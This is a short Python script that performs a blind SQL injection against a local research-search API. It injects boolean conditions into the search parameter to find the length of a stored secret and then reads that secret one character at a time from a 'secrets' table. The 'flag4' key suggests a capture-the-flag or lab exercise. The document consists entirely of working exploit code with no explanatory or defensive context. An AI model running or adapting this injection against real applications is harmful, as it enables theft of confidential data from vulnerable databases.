import subprocess, json

def count_for(q):
    out = subprocess.check_output(
        ['curl','-s','-G','--data-urlencode','q='+q,
         'http://localhost:3003/api/research/search'])
    return json.loads(out).get('count')

base = count_for("neuroinflammation")  # 2

# Length
L = next(
    n for n in range(1, 80)
    if count_for(
        f"neuroinflammation%' AND (SELECT LENGTH(secret_value) "
        f"FROM secrets WHERE secret_key='flag4_abcd12')={n} --"
    ) == base
)

# Characters
alphabet = [ord(c) for c in
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_{}|"]

chars = []
for i in range(1, L+1):
    for code in alphabet:
        q = (f"neuroinflammation%' AND ascii(substr("
             f"(SELECT secret_value FROM secrets WHERE secret_key='flag4_abcd12'),"
             f"{i},1))={code} --")
        if count_for(q) == base:
            chars.append(chr(code))
            break
print("".join(chars))